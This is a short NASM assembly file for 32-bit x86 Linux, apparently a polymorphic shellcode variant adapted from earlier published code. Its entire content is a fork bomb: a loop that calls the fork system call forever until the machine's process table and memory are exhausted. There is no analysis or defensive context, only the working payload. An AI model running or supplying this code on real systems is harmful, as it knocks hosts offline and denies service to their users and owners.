; Filename: fork-poly.nasm
; Author: Xavi Beltran
; Date: 05/11/2019
; Based on Kris Katterjohn code

section .text

global _start

 _start:
	xor eax, eax
	mov al, 2
	int 0x80
	jmp _start
